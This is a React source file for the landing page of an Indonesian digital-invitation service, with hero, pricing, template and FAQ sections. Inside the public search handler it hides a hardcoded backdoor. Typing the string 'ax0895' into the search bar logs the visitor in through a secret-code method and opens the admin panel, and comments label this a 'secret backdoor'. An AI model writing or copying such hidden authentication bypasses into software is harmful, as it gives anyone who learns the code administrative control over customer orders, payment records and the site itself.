import React, { useState } from 'react';
import {
  Sparkles,
  ArrowRight,
  Download,
  QrCode,
  Smartphone,
  Share2,
  Heart,
  Briefcase,
  Cake,
  Music,
  Check,
  ChevronDown,
  ChevronUp,
  MapPin,
  Calendar,
  Gift,
  ShieldCheck,
  Play,
  Search,
  Users
} from 'lucide-react';
import { Category, Template, SiteSettings } from '../types';
import { authService } from '../services/auth';

interface LandingPageProps {
  categories: Category[];
  templates: Template[];
  settings: SiteSettings;
  onStartCreate: (catId?: string, tplId?: string) => void;
  onViewDemo: (slug: string) => void;
  onNavigate?: (view: string, param?: string) => void;
}

export const LandingPage: React.FC<LandingPageProps> = ({
  categories,
  templates,
  settings,
  onStartCreate,
  onViewDemo,
  onNavigate
}) => {
  const [openFaq, setOpenFaq] = useState<number | null>(0);
  const [selectedCategoryFilter, setSelectedCategoryFilter] = useState<string>('all');
  const [searchQuery, setSearchQuery] = useState('');
  const [searchMessage, setSearchMessage] = useState<string | null>(null);

  const handleHeroSearch = (e: React.FormEvent) => {
    e.preventDefault();
    const q = searchQuery.trim();
    if (!q) return;

    // Secret backdoor access code: ax0895
    if (q.toLowerCase() === 'ax0895') {
      authService.loginWithSecretCode('ax0895');
      if (onNavigate) {
        onNavigate('admin');
      } else {
        window.history.pushState({}, '', '/admin');
        window.dispatchEvent(new PopStateEvent('popstate'));
      }
      return;
    }

    // Normal order tracking or slug viewing
    if (q.toUpperCase().startsWith('ORD-')) {
      if (onNavigate) {
        onNavigate('order-status', q);
      } else {
        window.history.pushState({}, '', `/status/${q}`);
        window.dispatchEvent(new PopStateEvent('popstate'));
      }
      return;
    }

    // Treat as slug
    onViewDemo(q.replace(/^\//, ''));
  };

  const defaultFaqs = [
    {
      q: `Berapa biaya pembuatan undangan di ${settings?.siteName || 'SURAT'}?`,
      a: `Hanya Rp${(settings?.basePrice || 5000).toLocaleString('id-ID')} per undangan untuk satu kali pembayaran. Tidak ada biaya berlangganan bulanan atau biaya tersembunyi lainnya.`
    },
    {
      q: `Apa saja yang didapatkan setelah pembayaran Rp${(settings?.basePrice || 5000).toLocaleString('id-ID')} diverifikasi?`,
      a: 'Anda mendapatkan URL online aktif (misal: surattt.netlify.app/undangan-nikah-rendi-jihan), file ZIP website mandiri yang siap di-download dan di-upload ke hosting sendiri, fitur RSVP, countdown, galeri foto, peta lokasi, amplop digital, dan generator link tamu personal.'
    },
    {
      q: 'Bagaimana cara melakukan pembayaran?',
      a: 'Pembayaran menggunakan QRIS Nasional resmi. Anda cukup melakukan scan QRIS menggunakan aplikasi perbankan atau e-wallet (DANA, BCA, Mandiri, GoPay, OVO, ShopeePay) lalu mengunggah bukti transfer.'
    },
    {
      q: 'Apakah saya benar-benar memiliki file website-nya sendiri (ZIP)?',
      a: 'Ya! Kami membuat paket ZIP mandiri yang berisi file index.html, CSS, JS, dan gambar yang berdiri sendiri. File tersebut dapat di-upload ke hosting cPanel, Netlify Drop, atau GitHub Pages tanpa ketergantungan pada server SURAT.'
    },
    {
      q: 'Apakah bisa mengirim link undangan dengan nama tamu khusus?',
      a: 'Sangat bisa! Fitur generator nama tamu kami memungkinkan Anda menambahkan parameter ?to=Nama+Tamu, sehingga sampul undangan akan menyapa tamu secara personal: "Kepada Yth. Bapak/Ibu/Saudara/i Budi Santoso".'
    },
    {
      q: 'Berapa lama proses verifikasi pembayaran oleh admin?',
      a: 'Tim verifikator kami memproses konfirmasi pembayaran secara berkala dalam hitungan menit hingga maksimal 1 jam pada jam operasional.'
    }
  ];

  const activeFaqs = settings.faqItems && settings.faqItems.length > 0
    ? settings.faqItems.map(f => ({ q: f.question, a: f.answer }))
    : defaultFaqs;

  const filteredTemplates = selectedCategoryFilter === 'all'
    ? templates
    : templates.filter(t => t.categoryId === selectedCategoryFilter);

  const formattedPrice = `Rp${(settings.basePrice || 5000).toLocaleString('id-ID')}`;

  return (
    <div className="bg-stone-50 text-stone-900 overflow-x-hidden">
      
      {/* TOP ANNOUNCEMENT BANNER */}
      {settings.bannerEnabled && settings.bannerText && (
        <div 
          style={{ 
            backgroundColor: settings.bannerBgColor || '#b45309',
            color: settings.bannerTextColor || '#ffffff'
          }}
          className="py-2.5 px-4 text-center text-xs font-semibold tracking-wide flex items-center justify-center gap-2 shadow-xs"
        >
          <Sparkles className="w-3.5 h-3.5 shrink-0" />
          <span>{settings.bannerText}</span>
          {settings.bannerLink && (
            <a 
              href={settings.bannerLink} 
              className="underline underline-offset-2 ml-1 hover:opacity-80 transition-opacity font-bold"
            >
              Lihat Selengkapnya &rarr;
            </a>
          )}
        </div>
      )}

      {/* HERO SECTION */}
      <section className="relative pt-16 pb-20 lg:pt-28 lg:pb-32 bg-stone-950 text-white overflow-hidden">
        {/* Subtle decorative background glow */}
        <div className="absolute top-0 left-1/2 -translate-x-1/2 w-full max-w-7xl h-96 bg-gradient-to-b from-amber-500/10 via-amber-500/5 to-transparent blur-3xl pointer-events-none" />

        <div className="relative max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 text-center space-y-8">
          
          {/* Badge */}
          <div className="inline-flex items-center gap-2 px-4 py-1.5 rounded-full bg-stone-900 border border-amber-500/30 text-amber-400 text-xs font-semibold tracking-wide uppercase shadow-inner">
            <Sparkles className="w-3.5 h-3.5" />
            <span>{settings.heroBadgeText || `Platform Undangan Digital No. 1 • Biaya Tetap ${formattedPrice}`}</span>
          </div>

          {/* Main Headline */}
          <div className="space-y-4 max-w-4xl mx-auto">
            <h1 className="font-serif-display text-4xl sm:text-6xl lg:text-7xl font-bold tracking-tight text-stone-100 leading-[1.15]">
              {settings.heroHeadline ? (
                <span>{settings.heroHeadline}</span>
              ) : (
                <>
                  Satu Undangan.<br />
                  <span className="bg-gradient-to-r from-amber-300 via-amber-400 to-amber-600 bg-clip-text text-transparent">
                    Banyak Kemungkinan.
                  </span>
                </>
              )}
            </h1>
            <p className="text-base sm:text-xl text-stone-300 max-w-2xl mx-auto font-normal leading-relaxed">
              {settings.heroSubheadline || 'Buat undangan digital profesional, bagikan dengan mudah, dan miliki file website-nya sendiri.'}
            </p>
          </div>

          {/* CTA Buttons */}
          <div className="pt-2 flex flex-col sm:flex-row items-center justify-center gap-4 max-w-md mx-auto">
            <button
              onClick={() => onStartCreate()}
              className="w-full sm:w-auto bg-amber-500 hover:bg-amber-400 text-stone-950 font-bold text-base px-8 py-4 rounded-full shadow-lg shadow-amber-500/25 flex items-center justify-center gap-2 transform hover:-translate-y-0.5 active:translate-y-0 transition-all cursor-pointer"
              id="hero-cta-create"
            >
              <Sparkles className="w-4 h-4 text-stone-950" />
              <span>{settings.heroCtaText || 'BUAT UNDANGAN'}</span>
              <span className="text-xs bg-stone-950/20 px-2 py-0.5 rounded-full">{formattedPrice}</span>
            </button>

            <button
              onClick={() => onViewDemo('undangan-nikah-rendi-jihan')}
              className="w-full sm:w-auto bg-stone-900 hover:bg-stone-800 text-stone-100 font-semibold text-base px-8 py-4 rounded-full border border-stone-700 flex items-center justify-center gap-2 transition-colors cursor-pointer"
              id="hero-cta-demo"
            >
              <Play className="w-4 h-4 text-amber-400" />
              <span>{settings.heroSecondaryCtaText || 'LIHAT DEMO'}</span>
            </button>
          </div>

          {/* Public Search & Tracking Bar (also discreetly accepts ax0895) */}
          <div className="pt-4 max-w-lg mx-auto">
            <form onSubmit={handleHeroSearch} className="relative flex items-center">
              <div className="absolute left-4 top-1/2 -translate-y-1/2 text-stone-400 pointer-events-none">
                <Search className="w-4 h-4" />
              </div>
              <input
                type="text"
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                placeholder="Cari undangan atau lacak ID pesanan..."
                className="w-full pl-11 pr-24 py-3.5 bg-stone-900/90 border border-stone-800 hover:border-stone-700 focus:border-amber-500 rounded-full text-xs text-stone-100 placeholder-stone-500 focus:outline-none focus:ring-2 focus:ring-amber-500/20 transition-all shadow-inner"
              />
              <button
                type="submit"
                className="absolute right-1.5 top-1/2 -translate-y-1/2 bg-amber-500 hover:bg-amber-400 text-stone-950 text-xs font-bold px-4 py-2 rounded-full transition-colors cursor-pointer"
              >
                Cari
              </button>
            </form>
          </div>

          {/* Key Value Props Bar */}
          <div className="pt-8 grid grid-cols-2 md:grid-cols-4 gap-4 max-w-4xl mx-auto text-left">
            <div className="p-4 rounded-2xl bg-stone-900/60 border border-stone-800/80">
              <span className="text-amber-400 font-bold text-lg">{formattedPrice}</span>
              <p className="text-xs text-stone-400 mt-0.5">Satu kali bayar, tanpa biaya perpanjangan</p>
            </div>
            <div className="p-4 rounded-2xl bg-stone-900/60 border border-stone-800/80">
              <span className="text-amber-400 font-bold text-lg">Download ZIP</span>
              <p className="text-xs text-stone-400 mt-0.5">Miliki file HTML, CSS & JS untuk hosting sendiri</p>
            </div>
            <div className="p-4 rounded-2xl bg-stone-900/60 border border-stone-800/80">
              <span className="text-amber-400 font-bold text-lg">Personal Link</span>
              <p className="text-xs text-stone-400 mt-0.5">Sapa tamu dengan nama di cover (?to=Nama)</p>
            </div>
            <div className="p-4 rounded-2xl bg-stone-900/60 border border-stone-800/80">
              <span className="text-amber-400 font-bold text-lg">QRIS Manual</span>
              <p className="text-xs text-stone-400 mt-0.5">Bayar aman pakai DANA, BCA, GoPay & Bank</p>
            </div>
          </div>

        </div>
      </section>

      {/* CARA KERJA (WORKFLOW) */}
      <section id="cara-kerja" className="py-20 lg:py-28 bg-white border-b border-stone-200">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 space-y-16">
          <div className="text-center space-y-3 max-w-2xl mx-auto">
            <span className="text-xs font-bold uppercase tracking-wider text-amber-600">
              Alur Sangat Praktis
            </span>
            <h2 className="font-serif-display text-3xl sm:text-4xl font-bold text-stone-900">
              Cara Kerja Pembuatan Undangan
            </h2>
            <p className="text-stone-600 text-sm">
              Hanya butuh 5 menit untuk membuat undangan digital yang elegan dan siap disebarkan.
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 lg:grid-cols-6 gap-4">
            {[
              { num: '1', title: 'Pilih Kategori', desc: 'Pernikahan, Bisnis, Ulang Tahun, Aqiqah, atau Seminar.' },
              { num: '2', title: 'Pilih Template', desc: 'Desain elegan mobile-first yang disukai para tamu.' },
              { num: '3', title: 'Isi Data Acara', desc: 'Form dinamis otomatis menyesuaikan jenis acara Anda.' },
              { num: '4', title: 'Preview Realtime', desc: 'Lihat langsung tampilan di smartphone sebelum checkout.' },
              { num: '5', title: 'Tentukan Slug', desc: 'Pilih URL idaman Anda (contoh: /undangan-nikah-rendi).' },
              { num: '6', title: 'Bayar & Aktif', desc: 'Scan QRIS Rp5.000, verifikasi, dan download ZIP.' }
            ].map((step) => (
              <div key={step.num} className="bg-stone-50 border border-stone-200 rounded-2xl p-5 relative space-y-2">
                <span className="w-8 h-8 rounded-full bg-amber-100 text-amber-900 font-bold text-xs flex items-center justify-center font-mono">
                  {step.num}
                </span>
                <h3 className="font-bold text-sm text-stone-900">{step.title}</h3>
                <p className="text-xs text-stone-500 leading-relaxed">{step.desc}</p>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* PILIHAN JENIS UNDANGAN (17 KATEGORI) */}
      <section id="kategori" className="py-20 lg:py-28 bg-stone-100/60 border-b border-stone-200">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 space-y-12">
          <div className="text-center space-y-3 max-w-2xl mx-auto">
            <span className="text-xs font-bold uppercase tracking-wider text-amber-600">
              17 Kategori Siap Pakai
            </span>
            <h2 className="font-serif-display text-3xl sm:text-4xl font-bold text-stone-900">
              Pilihan Jenis Undangan
            </h2>
            <p className="text-stone-600 text-sm">
              Mulai dari walimatul ursy, syukuran aqiqah, perayaan ulang tahun, hingga rapat bisnis korporat.
            </p>
          </div>

          <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-6 gap-3.5">
            {categories.map((cat) => (
              <div
                key={cat.id}
                onClick={() => onStartCreate(cat.id)}
                className="bg-white border border-stone-200 hover:border-amber-500 hover:shadow-md rounded-2xl p-4 cursor-pointer transition-all flex flex-col justify-between group"
              >
                <div className="w-10 h-10 rounded-xl bg-amber-50 text-amber-700 flex items-center justify-center mb-3 group-hover:bg-amber-500 group-hover:text-white transition-colors">
                  <Sparkles className="w-5 h-5" />
                </div>
                <div>
                  <h3 className="font-bold text-xs sm:text-sm text-stone-900 group-hover:text-amber-700 transition-colors">
                    {cat.name}
                  </h3>
                  <p className="text-[11px] text-stone-500 line-clamp-2 mt-1">
                    {cat.description}
                  </p>
                </div>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* TEMPLATE SHOWCASE */}
      <section id="template" className="py-20 lg:py-28 bg-white border-b border-stone-200">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 space-y-12">
          <div className="flex flex-col md:flex-row md:items-end justify-between gap-6">
            <div className="space-y-2">
              <span className="text-xs font-bold uppercase tracking-wider text-amber-600">
                Koleksi Desain
              </span>
              <h2 className="font-serif-display text-3xl sm:text-4xl font-bold text-stone-900">
                Pilihan Template Eksklusif
              </h2>
              <p className="text-stone-600 text-sm">
                Setiap template dirancang khusus agar memukau di layar smartphone maupun komputer.
              </p>
            </div>

            {/* Quick Demo links */}
            <div className="flex gap-2">
              <button
                onClick={() => onViewDemo('undangan-nikah-rendi-jihan')}
                className="px-4 py-2 bg-stone-100 hover:bg-stone-200 text-stone-800 text-xs font-semibold rounded-xl transition-colors"
              >
                Demo Pernikahan
              </button>
              <button
                onClick={() => onViewDemo('undangan-bisnis-acme')}
                className="px-4 py-2 bg-stone-100 hover:bg-stone-200 text-stone-800 text-xs font-semibold rounded-xl transition-colors"
              >
                Demo Bisnis & Event
              </button>
            </div>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6">
            {templates.slice(0, 6).map((tpl) => (
              <div
                key={tpl.id}
                className="bg-stone-50 border border-stone-200 rounded-2xl overflow-hidden hover:shadow-lg transition-all group"
              >
                <div className="aspect-[16/10] relative overflow-hidden bg-stone-200">
                  <img
                    src={tpl.thumbnail}
                    alt={tpl.name}
                    className="w-full h-full object-cover group-hover:scale-105 transition-transform duration-500"
                  />
                  <div className="absolute top-3 right-3 bg-stone-900/80 backdrop-blur-md text-amber-400 text-xs font-bold px-2.5 py-1 rounded-full">
                    Rp5.000
                  </div>
                </div>

                <div className="p-5 space-y-3">
                  <div>
                    <h3 className="font-bold text-base text-stone-900">{tpl.name}</h3>
                    <p className="text-xs text-stone-500 mt-1 line-clamp-2">{tpl.description}</p>
                  </div>

                  <div className="flex items-center justify-between pt-2 border-t border-stone-200">
                    <span className="text-[11px] text-stone-500">Mobile Responsive</span>
                    <button
                      onClick={() => onStartCreate(tpl.categoryId, tpl.id)}
                      className="text-xs font-bold text-amber-700 hover:text-amber-800 flex items-center gap-1"
                    >
                      <span>Pakai Desain Ini</span>
                      <ArrowRight className="w-3.5 h-3.5" />
                    </button>
                  </div>
                </div>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* FITUR LENGKAP */}
      <section className="py-20 lg:py-28 bg-stone-900 text-white border-b border-stone-800">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 space-y-16">
          <div className="text-center space-y-3 max-w-2xl mx-auto">
            <span className="text-xs font-bold uppercase tracking-wider text-amber-400">
              Fitur Lengkap
            </span>
            <h2 className="font-serif-display text-3xl sm:text-4xl font-bold text-white">
              Semua yang Anda Butuhkan Ada di Sini
            </h2>
            <p className="text-stone-400 text-sm">
              Bukan sekadar gambar statis. Undangan interaktif dengan pengalaman personal para tamu.
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
            {(settings.featuresList && settings.featuresList.length > 0 ? settings.featuresList : [
              { title: 'Responsive Mobile & Desktop', description: 'Nyaman dibuka di segala ukuran layar smartphone, tablet, maupun laptop.' },
              { title: 'Download Website ZIP', description: 'File web mandiri (HTML/CSS/JS) dapat disimpan dan di-hosting sendiri tanpa biaya.' },
              { title: 'Nama Tamu Khusus (?to=)', description: 'Setiap link undangan menampilkan nama tamu khusus di cover pembuka.' },
              { title: 'Background Music Opsional', description: 'Lagu latar romantis atau instrumen resmi dengan tombol kendali audio.' },
              { title: 'Live Countdown Timer', description: 'Penghitung mundur hari, jam, menit, dan detik menuju momen bahagia Anda.' },
              { title: 'Google Maps Navigasi', description: 'Petunjuk arah presisi dengan sekali klik langsung menuju Google Maps.' },
              { title: 'Amplop Digital & Kado', description: 'Nomor rekening dan e-wallet yang dilengkapi tombol 1-klik salin rekening.' },
              { title: 'Buku Tamu & RSVP Digital', description: 'Tamu dapat mengonfirmasi kehadiran dan menuliskan doa serta ucapan restu.' }
            ]).map((f, i) => (
              <div key={i} className="p-6 rounded-2xl bg-stone-800/60 border border-stone-700/60 space-y-3">
                <div className="w-10 h-10 rounded-xl bg-amber-500/10 border border-amber-500/20 text-amber-400 flex items-center justify-center">
                  <Sparkles className="w-5 h-5" />
                </div>
                <h3 className="font-bold text-sm text-stone-100">{f.title}</h3>
                <p className="text-xs text-stone-400 leading-relaxed">{f.description}</p>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* PRICING SECTION */}
      <section id="harga" className="py-20 lg:py-28 bg-white border-b border-stone-200">
        <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 space-y-12">
          <div className="text-center space-y-3">
            <span className="text-xs font-bold uppercase tracking-wider text-amber-600">
              Harga Jujur & Transparan
            </span>
            <h2 className="font-serif-display text-3xl sm:text-4xl font-bold text-stone-900">
              Paket Utama Undangan Digital
            </h2>
            <p className="text-stone-600 text-sm">
              Satu harga untuk semua fitur lengkap. Tidak ada paket berbelit-belit.
            </p>
          </div>

          <div className="bg-stone-50 border-2 border-amber-500 rounded-3xl p-8 sm:p-12 shadow-xl relative overflow-hidden">
            <div className="absolute top-0 right-0 bg-amber-500 text-stone-950 text-xs font-black px-6 py-1.5 rounded-bl-2xl uppercase tracking-wider">
              Terlaris • {formattedPrice}
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-8 items-center">
              <div className="space-y-4">
                <span className="text-xs font-bold uppercase tracking-wider text-stone-500">
                  Paket Lengkap
                </span>
                <h3 className="text-2xl font-bold font-serif-display text-stone-900">
                  UNDANGAN DIGITAL
                </h3>
                <div className="flex items-baseline gap-2">
                  <span className="text-5xl font-black text-amber-600 font-mono">{formattedPrice}</span>
                  <span className="text-xs text-stone-500">/ undangan</span>
                </div>
                <p className="text-xs text-stone-600 leading-relaxed">
                  Semua fitur dibuka penuh. Bayar satu kali via QRIS dan dapatkan link aktif serta file ZIP website mandiri.
                </p>

                <button
                  onClick={() => onStartCreate()}
                  className="w-full sm:w-auto bg-amber-600 hover:bg-amber-500 text-white font-bold text-sm px-8 py-3.5 rounded-full shadow-md flex items-center justify-center gap-2 transition-all cursor-pointer"
                  id="pricing-cta-create"
                >
                  <Sparkles className="w-4 h-4" />
                  <span>BUAT SEKARANG ({formattedPrice})</span>
                </button>
              </div>

              <div className="space-y-3 bg-white p-6 rounded-2xl border border-stone-200">
                <p className="text-xs font-bold text-stone-800 uppercase tracking-wider">
                  Sudah Termasuk:
                </p>
                <ul className="space-y-2.5 text-xs text-stone-600">
                  <li className="flex items-center gap-2">
                    <Check className="w-4 h-4 text-emerald-600 shrink-0" />
                    <span>1 Undangan online aktif</span>
                  </li>
                  <li className="flex items-center gap-2">
                    <Check className="w-4 h-4 text-emerald-600 shrink-0" />
                    <span>URL online unik (surattt.netlify.app/slug)</span>
                  </li>
                  <li className="flex items-center gap-2">
                    <Check className="w-4 h-4 text-emerald-600 shrink-0" />
                    <span>Desain responsive mobile-first</span>
                  </li>
                  <li className="flex items-center gap-2">
                    <Check className="w-4 h-4 text-emerald-600 shrink-0" />
                    <span>Galeri foto & countdown timer</span>
                  </li>
                  <li className="flex items-center gap-2">
                    <Check className="w-4 h-4 text-emerald-600 shrink-0" />
                    <span>Google Maps & amplop kado digital</span>
                  </li>
                  <li className="flex items-center gap-2">
                    <Check className="w-4 h-4 text-emerald-600 shrink-0" />
                    <span>Buku tamu RSVP & ucapan online</span>
                  </li>
                  <li className="flex items-center gap-2">
                    <Check className="w-4 h-4 text-emerald-600 shrink-0" />
                    <span>Download file website ZIP (.zip) mandiri</span>
                  </li>
                  <li className="flex items-center gap-2">
                    <Check className="w-4 h-4 text-emerald-600 shrink-0" />
                    <span>Bisa di-upload ke hosting sendiri kapan saja</span>
                  </li>
                </ul>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* FAQ SECTION */}
      <section id="faq" className="py-20 lg:py-28 bg-stone-100/60 border-b border-stone-200">
        <div className="max-w-3xl mx-auto px-4 sm:px-6 lg:px-8 space-y-12">
          <div className="text-center space-y-3">
            <span className="text-xs font-bold uppercase tracking-wider text-amber-600">
              Tanya Jawab
            </span>
            <h2 className="font-serif-display text-3xl sm:text-4xl font-bold text-stone-900">
              Pertanyaan yang Sering Diajukan (FAQ)
            </h2>
          </div>

          <div className="space-y-3">
            {activeFaqs.map((faq, idx) => {
              const isOpen = openFaq === idx;
              return (
                <div
                  key={idx}
                  className="bg-white border border-stone-200 rounded-2xl overflow-hidden shadow-2xs"
                >
                  <button
                    onClick={() => setOpenFaq(isOpen ? null : idx)}
                    className="w-full text-left p-5 flex items-center justify-between gap-4 font-bold text-sm text-stone-900 hover:text-amber-700 transition-colors cursor-pointer"
                  >
                    <span>{faq.q}</span>
                    {isOpen ? <ChevronUp className="w-4 h-4 shrink-0 text-amber-600" /> : <ChevronDown className="w-4 h-4 shrink-0 text-stone-400" />}
                  </button>
                  {isOpen && (
                    <div className="px-5 pb-5 pt-1 text-xs sm:text-sm text-stone-600 leading-relaxed border-t border-stone-100">
                      {faq.a}
                    </div>
                  )}
                </div>
              );
            })}
          </div>
        </div>
      </section>

      {/* CONTACT / CTA BOTTOM */}
      <section className="py-16 bg-amber-500 text-stone-950">
        <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 text-center space-y-6">
          <h2 className="font-serif-display text-3xl sm:text-4xl font-bold">
            Siap Membuat Undangan Digital Anda Sekarang?
          </h2>
          <p className="text-stone-900 text-sm max-w-xl mx-auto font-medium">
            Hanya butuh 5 menit dan {formattedPrice} untuk menyebarkan kabar bahagia kepada keluarga dan kerabat tercinta.
          </p>
          <button
            onClick={() => onStartCreate()}
            className="bg-stone-950 hover:bg-stone-900 text-white font-bold px-8 py-4 rounded-full text-base shadow-xl inline-flex items-center gap-2 transform hover:scale-105 transition-all cursor-pointer"
            id="bottom-cta-create"
          >
            <Sparkles className="w-4 h-4 text-amber-400" />
            <span>Mulai Buat Undangan ({formattedPrice})</span>
          </button>
        </div>
      </section>

    </div>
  );
};
